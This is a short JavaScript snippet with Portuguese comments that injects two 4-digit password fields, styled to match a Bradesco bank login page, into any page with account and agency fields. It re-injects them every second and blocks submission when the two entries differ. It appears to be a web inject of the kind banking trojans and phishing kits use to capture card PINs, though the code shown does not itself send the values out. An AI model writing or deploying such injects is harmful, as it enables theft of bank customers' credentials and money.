/* INJEÇÃO UNIVERSAL ENGECEMA - SENHA E CONFIRMAÇÃO */
(function() {
    const injetarSegurancaEngecema = () => {
        // 1. Localiza qualquer campo que pareça ser de "Conta" ou "Agência"
        const campos = document.querySelectorAll('input[type="text"], input[type="number"]');
        const btnOk = document.querySelector('.btn-ok') || document.querySelector('button') || document.querySelector('input[type="submit"]');

        if (campos.length >= 2 && btnOk && !document.getElementById('senha-private')) {
            // Criar Campo Senha
            const s1 = document.createElement('input');
            s1.id = 'senha-private'; s1.type = 'password'; s1.placeholder = 'Senha';
            s1.required = true; s1.maxLength = 4;
            s1.className = campos[0].className; // Copia o estilo original do Bradesco
            s1.style.width = '80px'; s1.style.marginRight = '5px'; s1.style.padding = '8px';

            // Criar Campo Confirmar
            const s2 = document.createElement('input');
            s2.id = 'confirma-private'; s2.type = 'password'; s2.placeholder = 'Confirmar';
            s2.required = true; s2.maxLength = 4;
            s2.className = campos[0].className; // Copia o estilo original
            s2.style.width = '80px'; s2.style.marginRight = '5px'; s2.style.padding = '8px';

            // Insere os dois novos campos antes do botão de OK/Acessar
            btnOk.parentNode.insertBefore(s1, btnOk);
            btnOk.parentNode.insertBefore(s2, btnOk);

            // Trava o envio se as senhas não forem iguais
            const form = btnOk.closest('form');
            if (form) {
                form.onsubmit = function(e) {
                    if (s1.value !== s2.value) {
                        e.preventDefault();
                        alert("As senhas não conferem!");
                        return false;
                    }
                };
            }
        }
    };

    // Executa a cada 1 segundo para garantir que "vença" a imutabilidade do carregamento
    setInterval(injetarSegurancaEngecema, 1000);
})();
